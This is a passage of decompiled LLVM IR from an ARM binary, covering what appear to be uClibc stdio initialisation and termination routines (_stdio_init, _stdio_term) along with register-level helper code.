  %v1_15e18 = load i32, i32* %r0.global-to-local, align 4
  %v2_15e18 = add i32 %v1_15e18, 8
  %v3_15e18 = inttoptr i32 %v2_15e18 to i32*
  store i32 %v0_15e18, i32* %v3_15e18, align 4
  %v0_15e1c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15e1c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15e20

dec_label_pc_15e20:                               ; preds = %dec_label_pc_15e50.dec_label_pc_15e20_crit_edge, %dec_label_pc_15e18
  %v0_15e20 = phi i32 [ %v0_15e20.pre, %dec_label_pc_15e50.dec_label_pc_15e20_crit_edge ], [ %v0_15e1c, %dec_label_pc_15e18 ]
  %v1_15e20 = inttoptr i32 %v0_15e20 to i32*
  %v2_15e20 = load i32, i32* %v1_15e20, align 4
  store i32 %v2_15e20, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_15e20, i32* %r2.global-to-local, align 4
  %v2_15e2c71 = load i32, i32* %v1_15e20, align 4
  store i32 %v2_15e2c71, i32* %r3.global-to-local, align 4
  %v3_15e3073 = icmp uge i32 %v2_15e2c71, %v2_15e20
  store i1 %v3_15e3073, i1* %cpsr_c.global-to-local, align 1
  %v9_15e3079 = icmp eq i32 %v2_15e2c71, %v2_15e20
  br i1 %v9_15e3079, label %dec_label_pc_15e38, label %dec_label_pc_15e50

dec_label_pc_15e38:                               ; preds = %dec_label_pc_15e20, %dec_label_pc_15e38.dec_label_pc_15e2c_crit_edge
  %v0_15e3880 = phi i32 [ %v1_15e30.pre, %dec_label_pc_15e38.dec_label_pc_15e2c_crit_edge ], [ %v2_15e20, %dec_label_pc_15e20 ]
  store i32 %v0_15e3880, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15e48 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15e48, label %dec_label_pc_15e4c, label %dec_label_pc_15e38.dec_label_pc_15e2c_crit_edge

dec_label_pc_15e38.dec_label_pc_15e2c_crit_edge:  ; preds = %dec_label_pc_15e38
  %v0_15e2c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15e30.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15e2c = inttoptr i32 %v0_15e2c.pre to i32*
  %v2_15e2c = load i32, i32* %v1_15e2c, align 4
  store i32 %v2_15e2c, i32* %r3.global-to-local, align 4
  %v3_15e30 = icmp uge i32 %v2_15e2c, %v1_15e30.pre
  store i1 %v3_15e30, i1* %cpsr_c.global-to-local, align 1
  %v9_15e30 = icmp eq i32 %v2_15e2c, %v1_15e30.pre
  br i1 %v9_15e30, label %dec_label_pc_15e38, label %dec_label_pc_15e50

dec_label_pc_15e4c:                               ; preds = %dec_label_pc_15e38
  %v0_15e4c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15e4c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15e50

dec_label_pc_15e50:                               ; preds = %dec_label_pc_15e20, %dec_label_pc_15e38.dec_label_pc_15e2c_crit_edge, %dec_label_pc_15e4c
  %v0_15e58 = phi i32 [ %v0_15e4c, %dec_label_pc_15e4c ], [ %v2_15e2c71, %dec_label_pc_15e20 ], [ %v2_15e2c, %dec_label_pc_15e38.dec_label_pc_15e2c_crit_edge ]
  %v1_15e50 = phi i32 [ %v0_15e4c, %dec_label_pc_15e4c ], [ %v2_15e20, %dec_label_pc_15e20 ], [ %v1_15e30.pre, %dec_label_pc_15e38.dec_label_pc_15e2c_crit_edge ]
  %v3_15e50 = icmp uge i32 %v0_15e58, %v1_15e50
  store i1 %v3_15e50, i1* %cpsr_c.global-to-local, align 1
  %v9_15e50 = icmp eq i32 %v0_15e58, %v1_15e50
  br i1 %v9_15e50, label %dec_label_pc_15e58, label %dec_label_pc_15e50.dec_label_pc_15e20_crit_edge

dec_label_pc_15e50.dec_label_pc_15e20_crit_edge:  ; preds = %dec_label_pc_15e50
  %v0_15e20.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15e20

dec_label_pc_15e58:                               ; preds = %dec_label_pc_15e50
  %v2_15e58 = icmp ne i32 %v1_15e50, 0
  store i1 %v2_15e58, i1* %cpsr_c.global-to-local, align 1
  %v7_15e5c = icmp slt i32 %v1_15e50, 2
  br i1 %v7_15e5c, label %dec_label_pc_15e80, label %dec_label_pc_15e60

dec_label_pc_15e60:                               ; preds = %dec_label_pc_15e58
  %v0_15e60 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_15e60, i32* %r0.global-to-local, align 4
  %v0_15e64 = load i32, i32* @r1, align 4
  %v1_15e64 = add i32 %v0_15e64, 129
  store i32 %v1_15e64, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15e80

dec_label_pc_15e7c:                               ; preds = %dec_label_pc_15ac0, %dec_label_pc_15aa4, %dec_label_pc_15acc
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_15e80

dec_label_pc_15e80:                               ; preds = %dec_label_pc_15dfc, %dec_label_pc_15e58, %bb57, %dec_label_pc_15b04, %dec_label_pc_15e60, %dec_label_pc_15e7c
  %v0_15e80 = load i32, i32* @r5, align 4
  store i32 %v0_15e80, i32* %r0.global-to-local, align 4
  %v2_15e88 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_15e88, i32* %r4.global-to-local, align 4
  store i32 %v6_15a64, i32* @r5, align 4
  store i32 %v9_15a64, i32* @r6, align 4
  store i32 %v12_15a64, i32* @r7, align 4
  store i32 %v15_15a64, i32* @r8, align 4
  ret i32 %v0_15e80

; uselistorder directives
  uselistorder i32 %v0_15e4c, { 1, 0, 2 }
  uselistorder i32 %v1_15e30.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15e20, { 1, 0 }
  uselistorder i32 %v0_15dd0, { 1, 0, 2 }
  uselistorder i32 %v1_15db4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15da4, { 1, 0 }
  uselistorder i32 %v0_15d4c, { 1, 0, 2 }
  uselistorder i32 %v1_15d30.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15ce4, { 1, 0, 2 }
  uselistorder i32 %v1_15cc8, { 0, 2, 1 }
  uselistorder i32 %v4_15ca4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_15c54.pre, { 2, 1, 0 }
  uselistorder i32 %v0_15bd8, { 1, 2, 0 }
  uselistorder i32 %v1_15b68, { 1, 0 }
  uselistorder i32 %v0_15b68, { 1, 0 }
  uselistorder i32 %v1_15b50, { 1, 2, 0, 3 }
  uselistorder i32 %v1_15af4, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 13, 12, 14 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 7, 6, 1, 8, 9, 10, 11, 12, 14, 13, 2, 16, 15, 17, 18, 19, 20, 21, 22, 24, 23, 3, 25, 26, 27, 28, 29, 30, 31, 32, 33, 36, 34, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 25, 22, 23, 24, 26, 27, 28 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 4, 6, 5, 0, 7, 8, 9, 11, 10, 1, 12, 13, 15, 14, 2, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32 16384, { 66, 67, 0, 68, 37, 69, 38, 70, 39, 71, 40, 72, 41, 73, 42, 74, 18, 75, 17, 60, 3, 50, 35, 51, 4, 52, 36, 53, 5, 54, 6, 55, 7, 56, 8, 57, 9, 58, 10, 59, 34, 61, 11, 62, 12, 63, 13, 64, 14, 65, 43, 76, 15, 77, 16, 78, 20, 79, 45, 80, 46, 81, 47, 82, 19, 83, 44, 84, 85, 21, 86, 22, 87, 23, 88, 48, 89, 24, 1, 25, 90, 26, 91, 28, 92, 27, 93, 30, 94, 29, 95, 49, 96, 31, 2, 32, 97, 33, 98 }
  uselistorder i32 (i32, i32)* @__libc_open, { 8, 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 131072, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 14, 0, 13, 12, 11, 2, 1, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 1024, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 ()* @malloc, { 46, 45, 44, 4, 3, 2, 0, 1, 7, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 6, 5 }
  uselistorder i8 43, { 2, 0, 1 }
  uselistorder i32 ()* @free, { 10, 9, 5, 4, 3, 2, 1, 8, 7, 6, 0 }
  uselistorder i8 97, { 1, 0 }
  uselistorder label %dec_label_pc_15e80, { 5, 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_15e7c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15e50, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15e38, { 1, 0 }
  uselistorder label %dec_label_pc_15dfc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15dd4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15dbc, { 1, 0 }
  uselistorder label %dec_label_pc_15d60, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %dec_label_pc_15d50, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15d38, { 1, 0 }
  uselistorder label %dec_label_pc_15cf8, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_15ce8, { 1, 0 }
  uselistorder label %bb57, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15c30, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %dec_label_pc_15b98._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_15b40, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_15adc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15aa4, { 1, 2, 0 }
}

define i32 @function_15e94(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15e94:
  %v0_15e94 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15e94, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_15e94
  %v1_15e9c = load i32, i32* @r4, align 4
  %v2_15e9c = mul i32 %v1_15e9c, 89764
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15e94, %bb
  %v3_15e9c = phi i32 [ %arg1, %dec_label_pc_15e94 ], [ %v2_15e9c, %bb ]
  ret i32 %v3_15e9c

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %v0_15ecc = call i32 @__aeabi_read_tp()
  %v3_15ed0 = load i16, i16* @global_var_21a48.352, align 2
  %v4_15ed0 = sext i16 %v3_15ed0 to i32
  store i32 %v4_15ed0, i32* @r3, align 4
  store i32 %v0_15ecc, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v2_15edc = add i32 %v4_15ed0, %v0_15ecc
  %v3_15edc = inttoptr i32 %v2_15edc to i32*
  %v4_15edc = load i32, i32* %v3_15edc, align 4
  store i32 %v4_15edc, i32* @r6, align 4
  %v1_15ee0 = call i32 @isatty(i32 0)
  %v2_15ee8 = icmp eq i32 %v1_15ee0, 0
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* @r4, align 4
  br i1 %v2_15ee8, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_15ef4 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 308) to i16*), align 4
  %v7_15ef4 = zext i16 %v5_15ef4 to i32
  %v2_15ef8 = xor i32 %v7_15ef4, 256
  store i32 %v2_15ef8, i32* @r3, align 4
  %v2_15efc = trunc i32 %v2_15ef8 to i16
  store i16 %v2_15efc, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 308) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_15f04 = call i32 @isatty(i32 1)
  %v2_15f08 = icmp eq i32 %v1_15f04, 0
  br i1 %v2_15f08, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_15f10 = load i32, i32* @r4, align 4
  %v2_15f14 = add i32 %v1_15f10, 376
  %v3_15f14 = inttoptr i32 %v2_15f14 to i16*
  %v4_15f14 = load i16, i16* %v3_15f14, align 2
  %v2_15f18 = xor i16 %v4_15f14, 256
  store i16 %v2_15f18, i16* %v3_15f14, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v3_15f24 = load i16, i16* @global_var_21a48.352, align 2
  %v4_15f24 = sext i16 %v3_15f24 to i32
  %v0_15f28 = load i32, i32* @r6, align 4
  %v1_15f28 = load i32, i32* @r5, align 4
  %v3_15f28 = add i32 %v1_15f28, %v4_15f24
  %v4_15f28 = inttoptr i32 %v3_15f28 to i32*
  store i32 %v0_15f28, i32* %v4_15f28, align 4
  ret i32 %v1_15f04

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_15f44 = load i32, i32* @r4, align 4
  store i32 %v3_15f44, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r7.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 -33100), i32* %r3.global-to-local, align 4
  %v2_15f58 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 -33100) to i32*), align 4
  store i32 %v2_15f58, i32* %r0.global-to-local, align 4
  %v5_15f58 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 -33096) to i32*), align 4
  store i32 %v5_15f58, i32* %r1.global-to-local, align 4
  %v8_15f58 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 -33092) to i32*), align 4
  %v2_15f60 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_15f60, i32* %r3.global-to-local, align 4
  store i32 %v2_15f58, i32* %stack_var_-44, align 4
  store i32 152, i32* %r2.global-to-local, align 4
  %v4_15f6c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 152) to i32*), align 4
  store i32 %v2_15f58, i32* %r0.global-to-local, align 4
  store i32 %v5_15f58, i32* %r1.global-to-local, align 4
  store i32 %v8_15f58, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 -33112), i32* %r3.global-to-local, align 4
  %v1_15f7c = inttoptr i32 %v4_15f6c to i32*
  store i32 %v2_15f58, i32* %v1_15f7c, align 4
  %v3_15f7c = add i32 %v4_15f6c, 4
  %v4_15f7c = inttoptr i32 %v3_15f7c to i32*
  %v5_15f7c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15f7c, i32* %v4_15f7c, align 4
  %v6_15f7c = add i32 %v4_15f6c, 8
  %v7_15f7c = inttoptr i32 %v6_15f7c to i32*
  %v8_15f7c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_15f7c, i32* %v7_15f7c, align 4
  %v0_15f80 = load i32, i32* %r3.global-to-local, align 4
  %v1_15f80 = inttoptr i32 %v0_15f80 to i32*
  %v2_15f80 = load i32, i32* %v1_15f80, align 4
  store i32 %v2_15f80, i32* %r0.global-to-local, align 4
  %v3_15f80 = add i32 %v0_15f80, 4
  %v4_15f80 = inttoptr i32 %v3_15f80 to i32*
  %v5_15f80 = load i32, i32* %v4_15f80, align 4
  store i32 %v5_15f80, i32* %r1.global-to-local, align 4
  %v6_15f80 = add i32 %v0_15f80, 8
  %v7_15f80 = inttoptr i32 %v6_15f80 to i32*
  %v8_15f80 = load i32, i32* %v7_15f80, align 4
  %v2_15f84 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_15f84, i32* %r3.global-to-local, align 4
  store i32 %v2_15f80, i32* %stack_var_-56, align 4
  store i32 76, i32* %r2.global-to-local, align 4
  %v0_15f90 = load i32, i32* %r7.global-to-local, align 4
  %v2_15f90 = add i32 %v0_15f90, 76
  %v3_15f90 = inttoptr i32 %v2_15f90 to i32*
  %v4_15f90 = load i32, i32* %v3_15f90, align 4
  store i32 %v4_15f90, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r2.global-to-local, align 4
  %v1_15f98 = inttoptr i32 %v4_15f90 to i32*
  %v2_15f98 = load i32, i32* %v1_15f98, align 4
  store i32 %v2_15f98, i32* %r5.global-to-local, align 4
  %v2_15f9c = add i32 %v0_15f90, 160
  %v3_15f9c = inttoptr i32 %v2_15f9c to i32*
  %v4_15f9c = load i32, i32* %v3_15f9c, align 4
  store i32 %v2_15f80, i32* %r0.global-to-local, align 4
  store i32 %v5_15f80, i32* %r1.global-to-local, align 4
  store i32 %v8_15f80, i32* %r2.global-to-local, align 4
  store i32 -33124, i32* %r3.global-to-local, align 4
  %v2_15fac = add i32 %v0_15f90, -33124
  store i32 %v2_15fac, i32* %sl.global-to-local, align 4
  %v1_15fb0 = inttoptr i32 %v4_15f9c to i32*
  store i32 %v2_15f80, i32* %v1_15fb0, align 4
  %v3_15fb0 = add i32 %v4_15f9c, 4
  %v4_15fb0 = inttoptr i32 %v3_15fb0 to i32*
  %v5_15fb0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15fb0, i32* %v4_15fb0, align 4
  %v6_15fb0 = add i32 %v4_15f9c, 8
  %v7_15fb0 = inttoptr i32 %v6_15fb0 to i32*
  %v8_15fb0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_15fb0, i32* %v7_15fb0, align 4
  %v0_16040.pr = load i32, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1604016 = icmp eq i32 %v0_16040.pr, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1604818 = add i32 %v0_16040.pr, 56
  store i32 %v1_1604818, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_1604016, label %dec_label_pc_16054, label %dec_label_pc_15fb8

dec_label_pc_15fb8:                               ; preds = %entry, %.thread10
  %v0_15fb8 = phi i32 [ %v3_1603c, %.thread10 ], [ %v0_16040.pr, %entry ]
  %v1_15fb8 = add i32 %v0_15fb8, 64
  %v2_15fb8 = inttoptr i32 %v1_15fb8 to i32*
  %v3_15fb8 = load i32, i32* %v2_15fb8, align 4
  store i32 %v3_15fb8, i32* %r3.global-to-local, align 4
  %v0_15fbc = call i32 @__aeabi_read_tp()
  store i32 %v0_15fbc, i32* %r0.global-to-local, align 4
  %v1_15fc0 = add i32 %v0_15fbc, -1168
  store i32 %v1_15fc0, i32* %r6.global-to-local, align 4
  %v3_15fc4 = icmp uge i32 %v3_15fb8, %v1_15fc0
  store i1 %v3_15fc4, i1* %cpsr_c.global-to-local, align 1
  %v9_15fc4 = icmp eq i32 %v3_15fb8, %v1_15fc0
  br i1 %v9_15fc4, label %.thread1, label %dec_label_pc_15fd8

.thread1:                                         ; preds = %dec_label_pc_15fb8
  %v1_15fc8 = load i32, i32* %r5.global-to-local, align 4
  %v2_15fc8 = add i32 %v1_15fc8, 60
  %v3_15fc8 = inttoptr i32 %v2_15fc8 to i32*
  %v4_15fc8 = load i32, i32* %v3_15fc8, align 4
  %v2_15fcc = add i32 %v4_15fc8, 1
  store i32 %v2_15fcc, i32* %r3.global-to-local, align 4
  store i32 %v2_15fcc, i32* %v3_15fc8, align 4
  br label %.thread10

dec_label_pc_15fd8:                               ; preds = %dec_label_pc_15fb8, %dec_label_pc_15fe4
  %v0_15fd8 = load i32, i32* %r2.global-to-local, align 4
  %v1_15fd8 = inttoptr i32 %v0_15fd8 to i32*
  %v2_15fd8 = load i32, i32* %v1_15fd8, align 4
  store i32 %v2_15fd8, i32* %r3.global-to-local, align 4
  %v1_15fdc = load i32, i32* %r4.global-to-local, align 4
  %v3_15fdc = icmp uge i32 %v2_15fd8, %v1_15fdc
  store i1 %v3_15fdc, i1* %cpsr_c.global-to-local, align 1
  %v9_15fdc = icmp eq i32 %v2_15fd8, %v1_15fdc
  br i1 %v9_15fdc, label %dec_label_pc_15fe4, label %dec_label_pc_15ffc

dec_label_pc_15fe4:                               ; preds = %dec_label_pc_15fd8
  store i32 %v2_15fd8, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15ff4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15ff4, label %dec_label_pc_15ff8, label %dec_label_pc_15fd8

dec_label_pc_15ff8:                               ; preds = %dec_label_pc_15fe4
  %v0_15ff8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15ff8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15ffc

dec_label_pc_15ffc:                               ; preds = %dec_label_pc_15fd8, %dec_label_pc_15ff8
  %v0_15ffc = phi i32 [ %v0_15ff8, %dec_label_pc_15ff8 ], [ %v2_15fd8, %dec_label_pc_15fd8 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15ffc = icmp eq i32 %v0_15ffc, 0
  %v2_16008.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_15ffc, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_15ffc
  %v1_16008 = load i32, i32* %r6.global-to-local, align 4
  %v3_16008 = add i32 %v2_16008.pre, 64
  %v4_16008 = inttoptr i32 %v3_16008 to i32*
  store i32 %v1_16008, i32* %v4_16008, align 4
  %v1_1600c = load i32, i32* %r1.global-to-local, align 4
  %v2_1600c = load i32, i32* %r5.global-to-local, align 4
  %v3_1600c = add i32 %v2_1600c, 60
  %v4_1600c = inttoptr i32 %v3_1600c to i32*
  store i32 %v1_1600c, i32* %v4_1600c, align 4
  br label %.thread10

bb:                                               ; preds = %dec_label_pc_15ffc
  %v2_16000 = add i32 %v2_16008.pre, 8
  %v3_16000 = inttoptr i32 %v2_16000 to i32*
  %v4_16000 = load i32, i32* %v3_16000, align 4
  store i32 %v4_16000, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v3_16010 = add i32 %v2_16008.pre, 20
  %v4_16010 = inttoptr i32 %v3_16010 to i32*
  store i32 %v4_16000, i32* %v4_16010, align 4
  %v1_16014 = load i32, i32* %r2.global-to-local, align 4
  %v2_16014 = trunc i32 %v1_16014 to i16
  %v3_16014 = load i32, i32* %r5.global-to-local, align 4
  %v4_16014 = inttoptr i32 %v3_16014 to i16*
  store i16 %v2_16014, i16* %v4_16014, align 2
  %v1_16018 = load i32, i32* %r3.global-to-local, align 4
  %v2_16018 = load i32, i32* %r5.global-to-local, align 4
  %v3_16018 = add i32 %v2_16018, 24
  %v4_16018 = inttoptr i32 %v3_16018 to i32*
  store i32 %v1_16018, i32* %v4_16018, align 4
  %v1_1601c = load i32, i32* %r3.global-to-local, align 4
  %v2_1601c = load i32, i32* %r5.global-to-local, align 4
  %v3_1601c = add i32 %v2_1601c, 28
  %v4_1601c = inttoptr i32 %v3_1601c to i32*
  store i32 %v1_1601c, i32* %v4_1601c, align 4
  %v1_16020 = load i32, i32* %r3.global-to-local, align 4
  %v2_16020 = load i32, i32* %r5.global-to-local, align 4
  %v3_16020 = add i32 %v2_16020, 16
  %v4_16020 = inttoptr i32 %v3_16020 to i32*
  store i32 %v1_16020, i32* %v4_16020, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread1, %.thread5, %bb
  %v0_16024 = load i32, i32* %sl.global-to-local, align 4
  %v1_16024 = inttoptr i32 %v0_16024 to i32*
  %v2_16024 = load i32, i32* %v1_16024, align 4
  store i32 %v2_16024, i32* %r0.global-to-local, align 4
  %v3_16024 = add i32 %v0_16024, 4
  %v4_16024 = inttoptr i32 %v3_16024 to i32*
  %v5_16024 = load i32, i32* %v4_16024, align 4
  store i32 %v5_16024, i32* %r1.global-to-local, align 4
  %v6_16024 = add i32 %v0_16024, 8
  %v7_16024 = inttoptr i32 %v6_16024 to i32*
  %v8_16024 = load i32, i32* %v7_16024, align 4
  store i32 %v8_16024, i32* %r2.global-to-local, align 4
  %v1_1602c = load i32, i32* %r5.global-to-local, align 4
  %v2_1602c = add i32 %v1_1602c, 52
  %v3_1602c = inttoptr i32 %v2_1602c to i32*
  store i32 1, i32* %v3_1602c, align 4
  %v0_16030 = load i32, i32* %r5.global-to-local, align 4
  %v1_16030 = add i32 %v0_16030, 56
  store i32 %v1_16030, i32* %r3.global-to-local, align 4
  %v2_16034 = load i32, i32* %r0.global-to-local, align 4
  %v1_16038 = inttoptr i32 %v1_16030 to i32*
  store i32 %v2_16034, i32* %v1_16038, align 4
  %v3_16038 = add i32 %v0_16030, 60
  %v4_16038 = inttoptr i32 %v3_16038 to i32*
  %v5_16038 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16038, i32* %v4_16038, align 4
  %v6_16038 = add i32 %v0_16030, 64
  %v7_16038 = inttoptr i32 %v6_16038 to i32*
  %v8_16038 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_16038, i32* %v7_16038, align 4
  %v0_1603c = load i32, i32* %r5.global-to-local, align 4
  %v1_1603c = add i32 %v0_1603c, 32
  %v2_1603c = inttoptr i32 %v1_1603c to i32*
  %v3_1603c = load i32, i32* %v2_1603c, align 4
  store i32 %v3_1603c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16040 = icmp eq i32 %v3_1603c, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_16048 = add i32 %v3_1603c, 56
  store i32 %v1_16048, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_16040, label %dec_label_pc_16054, label %dec_label_pc_15fb8

dec_label_pc_16054:                               ; preds = %.thread10, %entry
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_16058 = load i32, i32* %r7.global-to-local, align 4
  %v2_16058 = add i32 %v0_16058, 76
  %v3_16058 = inttoptr i32 %v2_16058 to i32*
  %v4_16058 = load i32, i32* %v3_16058, align 4
  store i32 %v4_16058, i32* %r3.global-to-local, align 4
  %storemerge.in11 = inttoptr i32 %v4_16058 to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1607814 = icmp eq i32 %storemerge12, 0
  br i1 %v2_1607814, label %dec_label_pc_16080, label %dec_label_pc_16064

dec_label_pc_16064:                               ; preds = %dec_label_pc_16054, %dec_label_pc_16078
  %v1_1606c = phi i32 [ %storemerge, %dec_label_pc_16078 ], [ %storemerge12, %dec_label_pc_16054 ]
  %v1_16064 = inttoptr i32 %v1_1606c to i16*
  %v2_16064 = load i16, i16* %v1_16064, align 2
  %v3_16064 = zext i16 %v2_16064 to i32
  store i32 %v3_16064, i32* %r3.global-to-local, align 4
  %v1_16068 = and i32 %v3_16064, 64
  %v2_16068 = icmp eq i32 %v1_16068, 0
  br i1 %v2_16068, label %dec_label_pc_16078, label %bb39

bb39:                                             ; preds = %dec_label_pc_16064
  store i32 %v1_1606c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16078

dec_label_pc_16078:                               ; preds = %dec_label_pc_16064, %bb39
  %v1_16070 = xor i1 %v2_16068, true
  call void @__pseudo_cond_branch(i1 %v1_16070, i32 ptrtoint (i32* @global_var_160a8.631 to i32))
  %v0_16074 = load i32, i32* %r4.global-to-local, align 4
  %v1_16074 = add i32 %v0_16074, 32
  %storemerge.in = inttoptr i32 %v1_16074 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16078 = icmp eq i32 %storemerge, 0
  br i1 %v2_16078, label %dec_label_pc_16080, label %dec_label_pc_16064

dec_label_pc_16080:                               ; preds = %dec_label_pc_16078, %dec_label_pc_16054
  %v2_16084 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_16084, i32* %r4.global-to-local, align 4
  %v1_16088 = load i32, i32* %r0.global-to-local, align 4
